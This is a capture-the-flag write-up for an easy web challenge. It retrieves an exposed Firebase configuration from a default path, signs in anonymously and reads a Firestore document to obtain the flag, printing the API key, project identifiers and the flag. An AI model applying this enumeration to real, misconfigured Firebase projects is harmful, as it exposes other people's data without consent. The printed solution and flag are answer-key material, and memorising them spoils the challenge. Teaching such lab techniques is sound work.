# CTF Challenge Writeup: Eternal Flame

**Challenge Name:** Eternal Flame  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Author:** zeref  

## Challenge Description
Welcome to the Digital Islamic Library - Maktabat Al-Hikmah. Our scholars have preserved centuries of knowledge in the cloud. The head librarian, Sheikh Abdullah, has hidden a precious manuscript in the eternal flame of knowledge. Can you find the hidden wisdom?

**Flag:** `ghctf{th3_3t3rn4l_fl4m3_r3v34ls_h1dd3n_w1sd0m}`

---

## Vulnerability Analysis

### Exposed Firebase Configuration
The application exposes its Firebase configuration at the default path `/__/firebase/init.json`. This is a common misconfiguration where developers forget to restrict access to Firebase's reserved paths.

---

## Solution Walkthrough

### Step 1: Discovering the Firebase Configuration

The static page mentions "eternal flame" and hints at "default paths". Firebase uses a standard path for initialization:

```bash
curl http://localhost:8080/__/firebase/init.json
```

**Response:**
```json
{
  "apiKey": "AIzaSyB1kqIS-VeVk_KB4IlVE9vYBm7_7LGFrNQ",
  "authDomain": "greenhat-e5ed6.firebaseapp.com",
  "projectId": "greenhat-e5ed6",
  "storageBucket": "greenhat-e5ed6.firebasestorage.app",
  "messagingSenderId": "702590754082",
  "appId": "1:702590754082:web:b40770b4a154f30083997b",
  "measurementId": "G-550LT79K0N"
}
```

### Step 2: Understanding the Collections

The static page shows various scholar collections:
- `/scholars/imam-malik/muwatta`
- `/scholars/ibn-taymiyyah/wasitiyyah` ← This one mentions "Essential reading"
- `/scholars/imam-ahmad/musnad`
- etc.

### Step 3: Setting Up Firebase SDK

Create a simple script to connect to Firebase:

```javascript
const { initializeApp } = require('firebase/app');
const { getAuth, signInAnonymously } = require('firebase/auth');
const { getFirestore, collection, getDocs, doc, getDoc } = require('firebase/firestore');

const firebaseConfig = {
  "apiKey": "AIzaSyB1kqIS-VeVk_KB4IlVE9vYBm7_7LGFrNQ",
  "authDomain": "greenhat-e5ed6.firebaseapp.com",
  "projectId": "greenhat-e5ed6",
  "storageBucket": "greenhat-e5ed6.firebasestorage.app",
  "messagingSenderId": "702590754082",
  "appId": "1:702590754082:web:b40770b4a154f30083997b"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
```

### Step 4: Anonymous Authentication

The hint in the database mentions "Anonymous access is permitted":

```javascript
const userCredential = await signInAnonymously(auth);
console.log('Signed in anonymously');
```

### Step 5: Exploring the Collections

Based on the paths shown on the page, let's explore Ibn Taymiyyah's Wasitiyyah:

```javascript
// Check the wasitiyyah collection
const wasitiyyahRef = collection(db, 'scholars', 'ibn-taymiyyah', 'wasitiyyah');
const snapshot = await getDocs(wasitiyyahRef);

snapshot.forEach((doc) => {
  console.log(doc.id, '=>', doc.data());
});
```

### Step 6: Finding the Flag

The flag is stored in a document called `flag`:

```javascript
const flagRef = doc(db, 'scholars', 'ibn-taymiyyah', 'wasitiyyah', 'flag');
const flagDoc = await getDoc(flagRef);

if (flagDoc.exists()) {
  const data = flagDoc.data();
  console.log('Flag:', data.flag);
  console.log('Message:', data.message);
}
```

**Output:**
```
Flag: ghctf{th3_3t3rn4l_fl4m3_r3v34ls_h1dd3n_w1sd0m}
Message: مبارك! You have found the hidden wisdom in the eternal flame of knowledge.
```

